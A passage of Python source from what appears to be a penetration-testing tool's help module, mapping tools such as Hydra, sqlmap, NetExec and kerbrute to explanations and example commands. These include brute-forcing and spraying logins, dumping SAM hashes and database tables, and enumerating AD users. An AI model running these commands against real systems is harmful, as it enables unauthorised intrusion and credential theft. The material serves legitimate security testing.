                       "For every detected product with a version, run:\n"
                       "  searchsploit <product> <version>",
                "tools": ["whatweb", "wappalyzer", "searchsploit"],
                "cve": "N/A",
                "affects": "Any HTTP(S) service.",
            },
            "WHOIS": {
                "what": "Whois queries public registries for ownership, "
                        "contact, and allocation info about a domain or "
                        "IP range.",
                "get": "Organization, country, abuse contact, name "
                       "servers, creation / expiry dates. Useful for "
                       "OSINT and scope validation.",
                "how": "whois <domain>\nwhois <public IP>\n"
                       "NOTE: private IPs (RFC1918) return only IANA "
                       "boilerplate — whois is useless for lab/internal.",
                "tools": ["whois"],
                "cve": "N/A",
                "affects": "Any public domain or IP.",
            },
            "TRACEROUTE": {
                "what": "Traceroute maps the IP hops between you and the "
                        "target by sending packets with increasing TTL "
                        "and observing the ICMP time-exceeded replies.",
                "get": "List of intermediate routers — useful to "
                       "identify firewalls, DMZ placement, and the "
                       "network path. `* * *` hops = silent router or "
                       "ICMP-blocking device.",
                "how": "traceroute <target>              # UDP (default)\n"
                       "traceroute -T -p 80 <target>     # TCP-based — passes firewalls\n"
                       "traceroute -I <target>           # ICMP echo\n"
                       "OPSEC: loud — every hop logs your source IP.",
                "tools": ["traceroute", "tcptraceroute", "mtr"],
                "cve": "N/A",
                "affects": "Any reachable host.",
            },
            "DIG": {
                "what": "Dig queries DNS servers directly — A, AAAA, MX, "
                        "NS, TXT, SOA, CNAME, PTR records.",
                "get": "The actual DNS answer for each record type, "
                       "including mail servers and TXT entries (SPF, "
                       "DKIM, DMARC — useful for phishing pretext).",
                "how": "dig <domain> any\n"
                       "dig axfr @<ns> <domain>          # zone transfer (usually blocked)\n"
                       "dig -x <ip>                     # reverse lookup",
                "tools": ["dig", "host", "nslookup", "dnsrecon"],
                "cve": "N/A",
                "affects": "Any domain.",
            },
            "GEOIPLOOKUP": {
                "what": "GeoIP mapping of a public IP to country, region, "
                        "ISP/ASN, and (sometimes) lat/long.",
                "get": "Country + city + ISP/org. OSINT-level data; "
                       "never accurate enough for physical targeting.",
                "how": "geoiplookup <ip>\ncurl ipinfo.io/<ip>\n"
                       "curl ip-api.com/json/<ip>",
                "tools": ["geoiplookup", "curl"],
                "cve": "N/A",
                "affects": "Public IPs only (private IPs have no geo).",
            },
            "ENUM4LINUX": {
                "what": "Enum4linux runs a battery of SMB/RPC queries "
                        "(shares, users, groups, password policy, OS "
                        "details) against Windows / Samba hosts.",
                "get": "Domain name, SID, OS version, list of users and "
                       "groups, password policy, share ACLs. Great for "
                       "building the username wordlist for Kerberoast / "
                       "password spray.",
                "how": "enum4linux -a <target>\nenum4linux-ng <target>   # newer rewrite\n"
                       "Feed the user list into kerbrute passwordspray.",
                "tools": ["enum4linux-ng", "nxc smb", "rpcclient"],
                "cve": "N/A",
                "affects": "Windows / Samba targets.",
            },
            "HYDRA SSH": {
                "what": "Hydra SSH — online brute-force of SSH logins.",
                "get": "Valid SSH credentials. Auto-saved to the "
                       "Credential Store. Works on any OpenSSH / Dropbear "
                       "endpoint.",
                "how": "hydra -l root -P rockyou.txt ssh://<target>\n"
                       "hydra -L users.txt -P passwords.txt -t 4 "
                       "ssh://<target>\n"
                       "# -t 4 is safe; -t 16+ will trigger sshd's "
                       "MaxStartups rate limit.",
                "tools": ["hydra", "medusa", "ncrack"],
                "cve": "N/A",
                "affects": "SSH servers on port 22 (or -s <port> if "
                           "non-standard).",
            },
            "HYDRA FTP": {
                "what": "Hydra FTP — online brute-force of FTP logins.",
                "get": "Valid FTP credentials. Auto-saved to the "
                       "Credential Store.",
                "how": "hydra -l admin -P rockyou.txt ftp://<target>\n"
                       "# First check for anonymous:\n"
                       "hydra -l anonymous -p '' ftp://<target>",
                "tools": ["hydra", "medusa", "ncrack"],
                "cve": "N/A",
                "affects": "FTP servers on port 21.",
            },
            "HYDRA SMB": {
                "what": "Hydra SMB — online brute-force of Windows / "
                        "Samba authentication via the SMB protocol "
                        "(port 445).",
                "get": "Valid domain or local Windows credentials.",
                "how": "hydra -l administrator -P rockyou.txt smb://<target>\n"
                       "hydra -L users.txt -P passwords.txt smb://<target>\n"
                       "\n"
                       "NOTE: Windows accounts have a lockout policy "
                       "(default 5 bad attempts). Always spray ONE "
                       "password against many users rather than many "
                       "passwords against one user — use kerbrute for "
                       "that.",
                "tools": ["hydra", "nxc smb", "kerbrute"],
                "cve": "N/A",
                "affects": "Windows / Samba hosts with SMB open.",
            },
            "HYDRA RDP": {
                "what": "Hydra RDP — online brute-force of Remote Desktop "
                        "logins (port 3389).",
                "get": "Valid Windows RDP credentials.",
                "how": "hydra -l administrator -P rockyou.txt rdp://<target>\n"
                       "# RDP lockouts are aggressive — use kerbrute or\n"
                       "# spray instead of brute on real targets.",
                "tools": ["hydra", "nxc rdp", "kerbrute"],
                "cve": "N/A",
                "affects": "Windows servers with RDP exposed.",
            },
            "HYDRA HTTP-GET": {
                "what": "Hydra HTTP-GET — online brute-force of HTTP "
                        "Basic Authentication (the native browser "
                        "popup that prompts for user/password).",
                "get": "Valid basic-auth credentials for the endpoint.",
                "how": "# Target must challenge with 401 Basic Auth on\n"
                       "# the path; otherwise every attempt looks 'valid'.\n"
                       "hydra -l admin -P rockyou.txt http-get://<target>/admin/\n"
                       "\n"
                       "# To probe whether the path actually requires auth:\n"
                       "curl -I http://<target>/admin/      # look for:\n"
                       "#   HTTP/1.1 401 Unauthorized\n"
                       "#   WWW-Authenticate: Basic realm=\"...\"\n"
                       "\n"
                       "WARN: on a root path with no auth challenge, "
                       "hydra will mark every attempt as successful "
                       "(false positives). Always target a protected "
                       "directory.",
                "tools": ["hydra", "medusa", "curl"],
                "cve": "N/A",
                "affects": "Web servers using HTTP Basic Auth. If the "
                           "app uses a login form, use HYDRA HTTP-POST-FORM "
                           "(http-post-form://target/login:...) instead.",
            },
            "HYDRA HTTP-POST": {
                "what": "Hydra HTTP-POST-FORM — online brute-force of "
                        "form-based web logins (POST to /login with "
                        "user/pass fields).",
                "get": "Valid web-app credentials.",
                "how": "# Syntax — 3 colons:\n"
                       "#   http-post-form://<host>/<path>:<body>:<fail_string>\n"
                       "# ^USER^ and ^PASS^ are replaced on each attempt.\n"
                       "\n"
                       "hydra -l admin -P rockyou.txt \\\n"
                       "  http-post-form://<target>/login:user=^USER^&pass=^PASS^:F=invalid\n"
                       "\n"
                       "Capture the real form body with Burp or curl -v "
                       "first — CSRF tokens and hidden fields often break "
                       "blind brute force.",
                "tools": ["hydra", "wfuzz", "burp intruder"],
                "cve": "N/A",
                "affects": "Web apps with form-based login.",
            },
            "HYDRA": {
                "what": "Hydra performs online password brute-force "
                        "against 50+ protocols (SSH, FTP, HTTP, RDP, SMB, "
                        "MSSQL, etc).  See the protocol-specific entries "
                        "(HYDRA SSH, HYDRA SMB, HYDRA HTTP-GET...) for "
                        "tailored guidance.",
                "get": "Valid username/password pairs for the targeted "
                       "service. Results are auto-added to the Credential "
                       "Store and can be re-used across other services.",
                "how": "hydra -l admin -P rockyou.txt ssh://<target>\n"
                       "hydra -L users.txt -P passwords.txt smb://<target>\n"
                       "Mind account lockout policies.",
                "tools": ["hydra", "medusa", "patator", "ncrack"],
                "cve": "N/A",
                "affects": "Any auth'd service.",
            },
            "SMBCLIENT": {
                "what": "Smbclient is the Samba CLI — lists SMB shares "
                        "and opens interactive connections, anonymous or "
                        "authenticated.",
                "get": "List of shares (C$, ADMIN$, Public, ...), share "
                       "permissions, contents of accessible ones.",
                "how": "smbclient -L //<target> -N\n"
                       "smbclient //<target>/<SHARE> -N       # anonymous\n"
                       "smbclient //<target>/<SHARE> -U 'DOMAIN\\user%pass'",
                "tools": ["smbclient", "nxc smb", "smbmap"],
                "cve": "N/A",
                "affects": "Windows / Samba file servers.",
            },
            "SEARCHSPLOIT": {
                "what": "Searchsploit is the offline ExploitDB search — "
                        "local copy of exploit-db.com indexed by product, "
                        "version, and CVE.",
                "get": "Ready-to-use PoC exploits matching the target's "
                       "software. Each result has a file path you can cat "
                       "and adapt.",
                "how": "searchsploit <product> <version>\n"
                       "searchsploit -x <id>              # view the exploit\n"
                       "searchsploit -m <id>              # copy to CWD",
                "tools": ["searchsploit", "MSF"],
                "cve": "Varies",
                "affects": "Anything with a known version.",
            },
            "SQLMAP": {
                "what": "SQLMap is an automated SQL-injection scanner. It "
                        "crawls a web target, finds parameters, injects "
                        "payloads, and — if a param is vulnerable — "
                        "enumerates databases, tables, columns, and can "
                        "extract data or drop to a DB/OS shell.",
                "get": "Either confirmed SQLi with DB fingerprint + "
                       "extractable data, OR a clear negative (`no "
                       "injection detectable`). Common outputs:\n"
                       "  • 'no usable links found (with GET parameters)'\n"
                       "    → the crawler saw the page but there are NO\n"
                       "      GET params or HTML forms to test. This is\n"
                       "      NOT a vuln finding — sqlmap had nothing to\n"
                       "      attack. You must point it at a URL that\n"
                       "      actually has parameters.\n"
                       "  • 'parameter X is vulnerable'\n"
                       "    → real SQLi — proceed with --dbs, --tables.\n"
                       "  • 'all tested parameters do not appear to be\n"
                       "     injectable'\n"
                       "    → tested but nothing worked. Try --level 5\n"
                       "      --risk 3 or a different tamper script.",
                "how": "# 1. Aim at a specific URL with a parameter\n"
                       "sqlmap -u 'http://<target>/page.php?id=1' --batch --dbs\n"
                       "\n"
                       "# 2. If the target is POST-based, dump a Burp request\n"
                       "sqlmap -r request.txt --batch --dbs\n"
                       "\n"
                       "# 3. Bypass weak WAFs / filters\n"
                       "sqlmap -u '...' --tamper=space2comment --level=5 --risk=3\n"
                       "\n"
                       "# 4. Once a DB is vuln: extract\n"
                       "sqlmap -u '...' -D <dbname> --tables\n"
                       "sqlmap -u '...' -D <db> -T <table> --dump",
                "tools": ["sqlmap", "burp", "ghauri"],
                "cve": "N/A (tests for injection, not a specific CVE)",
                "affects": "Any web app that talks to a DB (MySQL, "
                           "PostgreSQL, MSSQL, Oracle, SQLite, ...).",
            },
            "WPSCAN": {
                "what": "WPScan is the WordPress-specific vulnerability "
                        "scanner. It fingerprints WP version, enumerates "
                        "plugins/themes/users, and looks up known CVEs.",
                "get": "WordPress version + list of installed plugins "
                       "and themes (with versions and known CVEs), "
                       "enumerated usernames, and optional brute-force "
                       "results via xmlrpc/wp-login.",
                "how": "wpscan --url http://<target>                  # basic\n"
                       "wpscan --url http://<target> -e ap,at,u        # aggressive\n"
                       "wpscan --url http://<target> --api-token <k>   # CVE lookup\n"
                       "wpscan --url http://<target> -U users.txt -P rockyou.txt",
                "tools": ["wpscan", "nuclei (wp templates)", "MSF"],
                "cve": "Varies — each outdated plugin/theme lists its own",
                "affects": "Any WordPress site.",
            },
            "NETEXEC": {
                "what": "NetExec (nxc / ex-CrackMapExec) is the multi-"
                        "protocol post-exploitation / enumeration tool "
                        "for SMB, WinRM, LDAP, MSSQL, SSH, FTP.",
                "get": "Shares, users, groups, password policy, logged-"
                       "on users, SAM dumps, session relay, and (with "
                       "creds) remote command execution.",
                "how": "nxc smb <target> -u '' -p ''                  # anon\n"
                       "nxc smb <target> -u user -p pass --shares\n"
                       "nxc smb <target> -u user -p pass --sam          # dump SAM\n"
                       "nxc winrm <target> -u user -p pass -x whoami\n"
                       "nxc ldap <target> -u user -p pass --users",
                "tools": ["netexec", "smbclient", "evil-winrm"],
                "cve": "N/A",
                "affects": "Windows / AD / any supported protocol.",
            },
            "CRACKMAPEXEC": {    # legacy name — same tool
                "what": "CrackMapExec is the multi-protocol post-exploit / "
                        "enumeration tool for SMB/WinRM/LDAP/MSSQL.  "
                        "Renamed NetExec (`nxc`) in 2023.",
                "get": "Same as NetExec — see the NETEXEC entry.",
                "how": "cme smb <target> -u user -p pass --shares",
                "tools": ["nxc (netexec)", "crackmapexec"],
                "cve": "N/A",
                "affects": "Windows / AD targets.",
            },
            "KERBRUTE": {
                "what": "Kerbrute talks Kerberos AS-REQ directly, "
                        "enumerating valid AD usernames or spraying "
                        "passwords without incrementing bad-pwd counters "
                        "(thus, without lockout — as long as the spray "
                        "stays below the policy window).",
                "get": "List of valid AD usernames "
                       "(`[+] VALID USERNAME: user@REALM`) and, in spray "
                       "mode, valid login pairs.",
                "how": "# Enumerate users from a wordlist\n"
                       "kerbrute userenum -d REALM --dc <dc_ip> users.txt\n"
                       "\n"
                       "# Spray a single password (respect lockout!)\n"
                       "kerbrute passwordspray -d REALM --dc <dc_ip> \\\n"
                       "         users.txt 'Spring2025!'",
                "tools": ["kerbrute", "rpcclient", "impacket GetNPUsers.py"],
                "cve": "N/A",
                "affects": "Active Directory domain controllers.",
            },
            "LDAPSEARCH": {
                "what": "LDAPsearch queries an LDAP / AD directory tree. "
                        "On a DC with anonymous bind enabled (or with "
                        "creds) it dumps the entire directory.",
                "get": "Domain structure, users (sAMAccountName, UPN), "
                       "groups, computers, GPOs, service principals "
                       "(SPNs — feed to kerberoasting).",
                "how": "# Anonymous base DN probe\n"
                       "ldapsearch -x -H ldap://<target> -s base namingcontexts\n"
                       "\n"
                       "# List users (with creds)\n"
                       "ldapsearch -x -H ldap://<target> \\\n"
                       "  -D 'CN=user,DC=foo,DC=com' -w 'pass' \\\n"
                       "  -b 'DC=foo,DC=com' '(objectClass=user)' sAMAccountName",
                "tools": ["ldapsearch", "nxc ldap", "windapsearch"],
                "cve": "N/A",
                "affects": "Active Directory / OpenLDAP directories.",
            },
            "FTP": {     # matches "FTP Anonymous" etc.
                "what": "FTP test checks for anonymous login and lists "
                        "the contents of the home directory.",
                "get": "Anonymous-readable files (backups, config, "
                       "internal docs, source code) — often directly "
                       "leak creds or intel.",
                "how": "# Interactive\n"
                       "ftp <target>                 # user: anonymous, pass: (blank)\n"
                       "# Scripted download of everything\n"
                       "wget -r ftp://anonymous:anonymous@<target>/",
                "tools": ["ftp", "wget", "curl", "lftp"],
                "cve": "N/A (misconfiguration)",
                "affects": "FTP servers with anonymous access enabled.",
            },
            "SSH": {      # matches "SSH Banner Grab" etc.
                "what": "SSH banner grab reads the server-side greeting "
                        "that advertises the SSH daemon + version (e.g. "
                        "`SSH-2.0-OpenSSH_7.4`).",
                "get": "Vendor (OpenSSH, Dropbear, libssh, ...) and "
                       "version — input for CVE lookup.",
                "how": "nc <target> 22                    # one-liner\n"
                       "ssh -v <target>                    # verbose handshake\n"
                       "nmap -sV -p 22 <target>            # scripted grab",
                "tools": ["nc", "ssh", "nmap", "searchsploit"],
                "cve": "Varies — match banner against CVEs",
                "affects": "Any SSH server.",
            },
            "GREENBONE": {
                "what": "Greenbone / OpenVAS is a full-spectrum "
                        "vulnerability scanner — the FOSS equivalent of "
                        "Nessus. It runs thousands of NVTs covering "
                        "network, OS, and application vulns.",
                "get": "Ranked list of findings with CVE mappings, CVSS "
                       "scores, and remediation advice. Exports "
                       "PDF/HTML/XML reports.",
                "how": "# HAWK wraps this — use the RUN button.  Manual:\n"
                       "sudo gvm-setup && sudo gvm-start\n"
                       "gvm-cli socket --xml '<get_tasks/>'",
                "tools": ["gvm-cli", "openvas", "nessus"],
                "cve": "Varies — findings come with CVE IDs",
                "affects": "Any reachable host.",
            },
        }

        # Prefix match — title always starts with "TOOLNAME —".  Sort
        # keys by length descending so more-specific variants (e.g.
        # "HYDRA HTTP-GET") win over the generic "HYDRA" entry.
        import re as _re
        matched = None
        for key in sorted(TOOL_INFO, key=len, reverse=True):
            if head.startswith(key):
                matched = dict(TOOL_INFO[key])
                break
        if not matched:
            for key in sorted(TOOL_INFO, key=len, reverse=True):
                if f"via {key.lower()}" in desc_low:
                    matched = dict(TOOL_INFO[key])
                    break
        if not matched:
            return None

        # ── False-positive detection for FFUF / GOBUSTER ─────────
        # When most entries share the same response size, the scan
        # had no proper filter and the results are noise.
        if head in ("FFUF", "GOBUSTER"):
            sizes = _re.findall(r'\((\d+)B\)', description or "")
            if len(sizes) >= 20:
                from collections import Counter
                top_size, top_count = Counter(sizes).most_common(1)[0]
                ratio = top_count / len(sizes)
                if ratio > 0.7:
                    matched["what"] = (
                        f"⚠️  LIKELY FALSE POSITIVES — {int(ratio*100)}% of "
                        f"responses have the same size ({top_size}B).\n\n"
                        f"The server returns an identical page for ANY "
                        f"path, so these are NOT real directories.\n"
                        f"Re-run with size filter to get real results.")
                    matched["get"] = (
                        "Nothing useful from this scan — the results "
                        "are noise. Only the 'Interesting (200 OK)' "
                        "entries at the bottom (if any) might be real.")
                    matched["how"] = (
                        f"Re-run with the false-positive size filtered:\n"
                        f"  ffuf -u http://<target>/FUZZ -w <wordlist> "
                        f"-fs {top_size}\n"
                        f"  gobuster dir -u http://<target> -w <wordlist> "
                        f"--exclude-length {top_size}\n\n"
                        f"Or filter by status code:\n"
                        f"  ffuf ... -fc 301,302,400,404")
        return matched

